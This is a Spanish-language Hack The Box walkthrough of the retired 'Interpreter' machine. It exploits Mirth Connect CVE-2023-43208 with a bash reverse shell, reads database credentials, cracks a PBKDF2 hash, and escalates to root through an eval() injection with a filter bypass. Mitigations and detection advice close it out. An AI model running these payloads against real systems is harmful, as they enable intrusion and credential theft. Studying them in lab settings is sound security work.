---
machine: Interpreter
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, mirth-connect, cve-2023-43208, xstream, eval, hl7]
---

# Interpreter — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Plataforma de integración sanitaria: **Mirth Connect 4.4.0** con **CVE-2023-43208**, deserialización Java pre-autenticación vía XStream en `/api/users`. Shell como `mirth`; el `mirth.properties` da credenciales de MariaDB, y un hash **PBKDF2-HMAC-SHA256** en `PERSON_PASSWORD` se rompe y se reutiliza por SSH. El root está en un servicio Flask local que solo escucha en `127.0.0.1:54321` y evalúa una **f-string con `eval()`** sobre datos del paciente.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh
80/tcp    http    Mirth Connect 4.4.0 (redirige a HTTPS)
443/tcp   https   Mirth Connect 4.4.0 / API REST
6661/tcp  mllp    listener HL7 v2 del canal interno
```

## Enumeración

- El `.jnlp` de la web descarga la versión exacta: `4.4.0`, anterior a 4.4.1 y por tanto vulnerable a **CVE-2023-43208**.
- La API REST sólo responde por HTTPS: `/api/server/version` en el 443 contesta `4.4.0`; en el 80 las rutas `/api/` dan 404.
- El canal `INTERPRETER - HL7 TO XML TO NOTIFY` del panel explica el flujo: un listener MLLP recibe HL7, lo pasa a XML y llama al notificador de `127.0.0.1:54321`.

```bash
curl -sk https://<IP>/api/server/version
curl -sk https://<IP>/api/channels | jq '.[].name'
```

## Foothold

XStream deserializa el XML de `/api/users` sin allowlist de clases. Con un PoC público:

```bash
git clone https://github.com/IHTeam-Sec/MirthRCE && cd MirthRCE
python3 exploit.py -t https://<IP> \
  -c "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"
```

```bash
nc -lvnp 4444
```

```text
uid=1000(mirth) gid=1000(mirth) groups=1000(mirth)
```

## Movimiento lateral

```bash
grep -iE "database\.(url|user|password)" /opt/mirthconnect/conf/mirth.properties
```

```text
database.url = jdbc:mysql://localhost:3306/mirthdb
database.user = mirth
database.password = <password>
```

```bash
mysql -u mirth -p'<password>' mirthdb \
  -e "select PERSON_ID, PASSWORD from PERSON_PASSWORD where PERSON_ID=2;"
```

```text
sedric | <hash PBKDF2-HMAC-SHA256, base64>
```

El hash es `PBKDF2WithHmacSHA256` con **600.000 iteraciones**, sal de 8 bytes y clave de 32, todo en base64; hay que reempaquetarlo al formato de hashcat (`sha256:600000:<sal>:<clave>`). Sin reempaquetar, hashcat no lo reconoce y parece un hash corrupto:

```bash
hashcat -m 10900 'sha256:600000:<salt_b64>:<key_b64>' /usr/share/wordlists/rockyou.txt
ssh sedric@<IP>
```

## Escalada de privilegios

```bash
ss -ltnp | grep '127.0.0.1'
```

```text
127.0.0.1:54321  python3  notif.py
```

El servicio corre como **root** (`notif.py`, `root:sedric`, 2332 bytes), recibe JSON de paciente y monta una plantilla **f-string** que acaba en `eval()`. La lista blanca de caracteres permite llaves, así que el campo del paciente inyecta la expresión:

```bash
curl -s http://127.0.0.1:54321/notify \
  -H 'Content-Type: application/json' \
  -d '{"firstname":"{__import__(\"os\").system(\"chmod +s /bin/bash\")}"}'
```

El servicio vive en `/usr/local/bin/notif.py` (`root:sedric`, 2332 bytes) y valida la entrada con una lista blanca que **sí permite llaves**, pero rechaza cualquier bloque interpretado que contenga `/`. Ese filtro se esquiva construyendo la barra en tiempo de ejecución con `chr(47)`, sin escribirla nunca:

```text
{"firstname": "{open(chr(47)+'root'+chr(47)+'root.txt').read()}"}
```

Si además se filtran los espacios, la orden se codifica en base64 y se decodifica dentro de la propia expresión (`__import__("base64").b64decode(...)`).

```bash
/bin/bash -p
# euid=0
```

## Evidencia

```text
/home/sedric/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones aprendidas

- **XStream** es reincidente (Mirth, Jenkins, OFBiz): versión sin allowlist equivale a RCE pre-auth.
- `mirth.properties` es el primer fichero a leer tras entrar en un Mirth; casi siempre lleva la BD en claro.
- Un servicio en `127.0.0.1` **no** es seguro: cualquier shell de usuario lo alcanza.
- Mitigación: Mirth parcheado con allowlist de XStream, secretos fuera de los `.properties` y ningún `eval()` sobre datos externos.

## Mitigaciones y detección

- Mirth Connect 4.4.1 o superior; el fallo está en el XStream sin allowlist de `/api/users`.
- Secretos de base de datos fuera de `mirth.properties` (variables de entorno o *vault*) y usuario de BD sin privilegios sobre el resto del host.
- El hash de `PERSON_PASSWORD` con PBKDF2 es correcto: el problema es la reutilización de esa contraseña en el sistema operativo.
- Ningún `eval()` sobre datos de paciente; plantillas fijas con parámetros y lista blanca de caracteres que excluya `{`/`}`.
- Detección: peticiones a `/api/users` con XML que declare clases Java, y procesos `python3` de servicio que lanzan `sh` o leen `/root`.

## Referencias

- [CVE-2023-43208](https://nvd.nist.gov/vuln/detail/CVE-2023-43208)
